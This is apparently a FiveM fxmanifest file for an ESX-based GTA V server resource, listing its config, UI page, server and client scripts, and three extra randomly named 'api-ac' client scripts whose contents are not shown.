fx_version "bodacious"

games {"gta5"}
lua54 'yes'

shared_script 'config.lua'

ui_page 'html/ui.html'

server_scripts {
	'@es_extended/locale.lua',
	'@oxmysql/lib/MySQL.lua',
	'server.lua'
}

client_scripts {
	'@es_extended/locale.lua',
	'@es_extended/imports.lua',
	'client.lua'
}

files {
	"html/ui.html",
	"html/script.js",
	"html/style.css"
}

client_script "api-ac_OJOKaWCvUYzT.lua"
client_script "api-ac_vOJKHGqGxvPe.lua"
client_script "api-ac_uuQhioHoEMHi.lua"